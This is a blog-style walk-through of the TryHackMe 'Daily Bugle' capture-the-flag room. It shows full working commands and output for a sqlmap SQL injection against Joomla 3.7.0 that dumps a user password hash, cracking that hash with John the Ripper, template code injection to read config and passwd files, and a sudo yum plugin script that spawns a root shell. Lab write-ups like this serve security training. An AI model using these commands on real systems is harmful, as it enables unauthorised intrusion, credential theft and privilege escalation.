---
title: "Walk-through of Daily Bugle from TryHackMe"
header:
  teaser: /assets/images/2021-02-23-22-46-55.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - Buffer Overflow
  - Reverse Engineering
  -
---

## Machine Information

![bugle](/assets/images/2021-02-23-22-46-55.png)

Daily Bugle is rated as a hard difficulty room on TryHackMe. We start by finding a Joomla based blog, which is vulnerable to SQL injection via SQLMap. We retrieve credentials that let us log in to the admin portal, where we add our own code to a template. From there we find more credentials which we use to access the server via SSH. Then we use a classic Yum exploit to gain root access.
<!--more-->

Skills required are basic SQLi knowledge and researching exploits. Skills learned are SQLMap usage, password cracking and exploiting sudo misconfiguration.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Hard - Daily Bugle](https://tryhackme.com/room/dailybugle) |
| Machine Release Date | 13th January 2020 |
| Date I Completed It | 23rd February 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
root@kali:/home/kali/thm/bugle# ports=$(nmap -p- --min-rate=1000 -T4 10.10.96.177 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:/home/kali/thm/bugle# nmap -p$ports -sC -sV -oA bugle 10.10.96.177
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 19:50 GMT
Nmap scan report for 10.10.96.177
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
```

From Nmap we see there are three ports open, also some interesting entries in robots.txt. We have Apache on port 80 running Joomla!. SSH on port 22 and mysql on 3306 will be for later, let's start by going to port 80 in our browser:

![bugle-homepage](/assets/images/2021-02-22-21-01-43.png)

We see a blog called Daily Bugle. We also have the answer to Task 1.

## Task 2

After a quick look around I can't see anything obvious on the blog, let's try gobuster to look for hidden folders:

```text
root@kali:/home/kali/thm/bugle# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.96.177
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.96.177
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/22 19:51:48 Starting gobuster
===============================================================
http://10.10.96.177/images (Status: 301)
http://10.10.96.177/modules (Status: 301)
http://10.10.96.177/bin (Status: 301)
http://10.10.96.177/plugins (Status: 301)
http://10.10.96.177/includes (Status: 301)
http://10.10.96.177/language (Status: 301)
http://10.10.96.177/components (Status: 301)
http://10.10.96.177/cache (Status: 301)
http://10.10.96.177/libraries (Status: 301)
http://10.10.96.177/tmp (Status: 301)
http://10.10.96.177/layouts (Status: 301)
http://10.10.96.177/administrator (Status: 301)
http://10.10.96.177/cli (Status: 301)
===============================================================
2021/02/22 19:53:48 Finished
===============================================================
```

We have a fair list of folders to look through. Let's also try Jooscan to see what it can find:

```text
root@kali:/home/kali/thm/bugle# apt-get install joomscan
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  joomscan
0 upgraded, 1 newly installed, 0 to remove and 311 not upgraded.
Need to get 0 B/64.3 kB of archives.
After this operation, 281 kB of additional disk space will be used.
Selecting previously unselected package joomscan.
(Reading database ... 307889 files and directories currently installed.)
Preparing to unpack .../joomscan_0.0.7-0kali2_all.deb ...
Unpacking joomscan (0.0.7-0kali2) ...
Setting up joomscan (0.0.7-0kali2) ...
Processing triggers for kali-menu (2021.1.2) ...

root@kali:/home/kali/thm/bugle# joomscan -u http://10.10.96.177
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.96.177 ...
[+] FireWall Detector
[++] Firewall not detected
[+] Detecting Joomla Version
[++] Joomla 3.7.0
[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable
[+] Checking Directory Listing
[++] directory has directory listing :
http://10.10.96.177/administrator/components
http://10.10.96.177/administrator/modules
http://10.10.96.177/administrator/templates
http://10.10.96.177/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found
[+] admin finder
[++] Admin page : http://10.10.96.177/administrator/
```

Joomscan confirms where the admin page is located. It also tells us the version is 3.7.0. Which let's us answer the first question on Task 2. 

Let's have a look:

![bugle-joomlaadmin](/assets/images/2021-02-22-21-03-44.png)

I tried a few credentials but no dice. I had a look in robots.txt to see if there was anything else:

![bugle-robots](/assets/images/2021-02-22-21-05-18.png)

Nothing new there either, so now we try to find an exploit:

```text
root@kali:/home/kali# searchsploit Joomla 3.7.0
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection               | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site      | php/webapps/43488.txt
--------------------------------------------------------- -------------------------------
```

We have a possible exploit for our version of Joomla, let's have a look at it:

```text
root@kali:/home/kali# searchsploit -x php/webapps/42033.txt
  Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection
      URL: https://www.exploit-db.com/exploits/42033
     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt
File Type: ASCII text, with CRLF line terminators
```

The exploit explains we can use sql injection to dump data from Joomla, here is the example:

```text
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

We just need to put in the Joomla server IP, and remove --level 5 to speed it up a bit:

```text
root@kali:/home/kali# sqlmap -u "http://10.10.96.177/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering]
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
    |_|V...       |_|   http://sqlmap.org

[*] starting @ 21:17:47 /2021-02-22/

[21:17:47] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[21:17:48] [INFO] testing connection to the target URL
[21:17:49] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=eepovqo30vh...074lj28j67'). Do you want to use those [Y/n] y
[21:17:54] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:17:55] [INFO] testing if the target URL content is stable
[21:17:55] [INFO] target URL content is stable
[21:17:55] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[21:17:56] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
<SNIP>
[21:26:42] [INFO] the back-end DBMS is MySQL
[21:26:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:26:43] [INFO] fetching database names
[21:26:43] [INFO] retrieved: 'information_schema'
[21:26:43] [INFO] retrieved: 'joomla'
[21:26:43] [INFO] retrieved: 'mysql'
[21:26:43] [INFO] retrieved: 'performance_schema'
[21:26:44] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[*] ending @ 21:26:44 /2021-02-22/
```

Using the exploit we've retrieved the databases, as Joomla is our target let's have a look at that one:

```text
root@kali:/home/kali# sqlmap -u "http://10.10.96.177/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5#stable}
 |_ -| . ["]     | .'| . |
 |___|_  [)]_|_|_|__,|  _|
       |_|V...       |_|   http://sqlmap.org

[*] starting @ 21:31:46 /2021-02-22/

[21:31:46] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ro; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[21:31:46] [INFO] resuming back-end DBMS 'mysql'
[21:31:46] [INFO] testing connection to the target URL
<SNIP>
Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
<SNIP>
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

[*] ending @ 21:31:57 /2021-02-22/
```

We have 72 tables from the Joomla database. My eyes are drawn straight to the users one, let's hope we can get usernames and passwords from it:

```text
root@kali:/home/kali# sqlmap -u "http://10.10.96.177/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla -T "#__users" --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5#stable}
 |_ -| . ["]     | .'| . |
 |___|_  [.]_|_|_|__,|  _|
       |_|V...       |_|   http://sqlmap.org

[*] starting @ 21:34:44 /2021-02-22/

[21:34:56] [INFO] fetching columns for table '#__users' in database 'joomla'
[21:34:56] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q] y
[21:35:08] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
>
[21:36:36] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[21:36:36] [INFO] adding words used on web page to the check list
[21:36:36] [INFO] starting 10 threads
[21:36:36] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[21:36:36] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
[21:36:36] [INFO] retrieved: id
[21:36:37] [INFO] retrieved: name
[21:36:38] [INFO] retrieved: username
[21:36:41] [INFO] retrieved: email
[21:37:05] [INFO] retrieved: password
[21:41:57] [INFO] retrieved: params
[21:43:17] [INFO] fetching entries for table '#__users' in database 'joomla'
[21:43:17] [INFO] retrieved: 'jonah@tryhackme.com'
[21:43:17] [INFO] retrieved: '811'
[21:43:17] [INFO] retrieved: 'Super User'
[21:43:17] [INFO] retrieved: ''
[21:43:18] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[21:43:18] [INFO] retrieved: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
| id  | name       | email               | params  | password                                                     | username |
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
| 811 | Super User | jonah@tryhackme.com | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.<HIDDEN>.V.d3p12kBtZutm | jonah    |
+-----+------------+---------------------+---------+--------------------------------------------------------------+----------+

[*] ending @ 21:43:18 /2021-02-22/
```

From the users table we have a Super User called jonah with a password that's been hashed. Lot's of ways to identify what type of hash has been used, often the simplest if just Google it:

![bugle-hashformat](/assets/images/2021-02-22-22-22-29.png)

We can use John The Ripper to try and crack this. Just copy the hash in to a txt file, and then point JTR at it with the rockyou wordlist:

```text
root@kali:/home/kali/thm/bugle# john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>     (?)
1g 0:00:01:33 DONE (2021-02-22 22:34) 0.01066g/s 19.58p/s 19.58c/s 19.58C/s sword..spider123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

You know have the answer to question 2 of Task 2.

## Exploiting Joomla

With the username and password we've retrieved I can log in to the admin portal for Joomla. Having done other CTF challenges like this one I know to have a look at altering templates:

![bugle-templates](/assets/images/2021-02-22-22-44-04.png)

In the templates section we see one is assigned for all pages:

![bugle-protostar](/assets/images/2021-02-22-22-45-02.png)

We can edit the index.php and add our own code:

![bugle-index](/assets/images/2021-02-22-22-53-05.png)

Now when we refresh the main page we see who the Joomla application is running as:

![bugle-whoami](/assets/images/2021-02-22-22-54-36.png)

If you Google how to reset the admin password for Joomla you find the official document [here](https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F) that explains it is held in the configuration.php file. Let's see if we can get to that by editing the template:

![bugle-catconfig](/assets/images/2021-02-23-21-50-21.png)

When we refresh the home page we now see the contents of the config file:

![bugle-config](/assets/images/2021-02-22-22-57-52.png)

I tried SSH with jonah and root using this password, which didn't work so went back to the template and had a further look this time at the passwd file to see what accounts existed:

![bugle-catpasswd](/assets/images/2021-02-23-21-53-26.png)

I noticed in the passwd file that Jonah has a different name for his login:

![bugle-passwd](/assets/images/2021-02-22-23-02-07.png)

## User Flag

Now I go back to SSH and try again, this time using the jjameson username:

```text
root@kali:/home/kali/thm/bugle# ssh jjameson@10.10.75.59
The authenticity of host '10.10.75.59 (10.10.75.59)' can't be established.
ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.75.59' (ECDSA) to the list of known hosts.
jjameson@10.10.75.59's password:
Last login: Mon Dec 16 05:14:55 2019 from netwars
```

I'm in, let's get the user flag before we move on:

```text
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
<HIDDEN>
```

## Root Flag

Having done a fair number of CTF challenges now, there's a couple of things to check before diving in to enumeration scripts like [LinEnum](https://github.com/rebootuser/LinEnum) or [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). If you have a user and are looking for your privilege escalation root then **sudo -l** is one of the first things I look at. For us here on this machine we hit the jackpot straight away:

```text
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

We see that our user jjameson can run yum as root by using sudo with no password required. There's a well known and widely documented exploit for yum, even if you didn't know about it a quick Google would take you straight to it:

![bugle-googleyum](/assets/images/2021-02-23-22-07-17.png)

GTFOBins is a fantastic resource for Unix binaries that can be exploited. For us we have a working example [here](https://gtfobins.github.io/gtfobins/yum/) on how to use one with Yum.

Simply copy the commands given in to a new file and save, mine looks like this:

```text
jjameson@dailybugle ~]$ cat yum.sh
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Make it executable and then run it to get to a root prompt:

```text
[jjameson@dailybugle ~]$ chmod +x yum.sh
[jjameson@dailybugle ~]$ ./yum.sh
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
```

Now we can grab the root flag and we have completed another room:

```text
sh-4.2# pwd
/home/jjameson
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
<HIDDEN>
```

All done. See you next time.
